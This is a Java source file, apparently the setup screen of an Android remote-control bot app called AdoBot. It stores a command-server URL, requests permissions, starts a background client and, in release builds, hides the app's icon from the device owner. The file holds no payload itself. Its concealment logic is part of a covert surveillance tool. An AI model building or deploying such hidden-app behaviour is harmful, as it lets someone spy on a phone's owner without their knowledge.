package com.android.adobot.activities;

import android.content.Context;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;

import com.android.adobot.BuildConfig;
import com.android.adobot.Constants;
import com.android.adobot.R;

/**
 * Created by adones on 2/26/17.
 */

public class MainActivity extends BaseActivity {

    private static final String TAG = "MainActivity";

    SharedPreferences prefs;
    EditText editTextUrl;
    Button btnSetUrl;
    String url = "";

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        prefs = this.getSharedPreferences("com.android.adobot", Context.MODE_PRIVATE);
        url = prefs.getString("serverUrl", Constants.DEVELOPMENT_SERVER);

        editTextUrl = (EditText) findViewById(R.id.edit_text_server_url);
        if (url != null) {
            if (!(url.equals(Constants.DEVELOPMENT_SERVER) || url.equals("")))
                // server is already set
                done();
            else
                editTextUrl.setText(url);
        }
        btnSetUrl = (Button) findViewById(R.id.btn_set_server);
        btnSetUrl.setOnClickListener(setUrlClickListener);
    }

    private View.OnClickListener setUrlClickListener = new View.OnClickListener() {
        @Override
        public void onClick(View v) {
            url = editTextUrl.getText().toString();
            setServerUrl(url);
        }
    };

    private void setServerUrl(String url) {
        prefs.edit().putString("serverUrl", url).commit();
        if (!hasPermissions()) {
            requestPermissions();
        } else {
            done();
        }
    }

    private void done() {
        startClient();
        if (!BuildConfig.DEBUG)
            hideApp();

        finish();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
    }
}
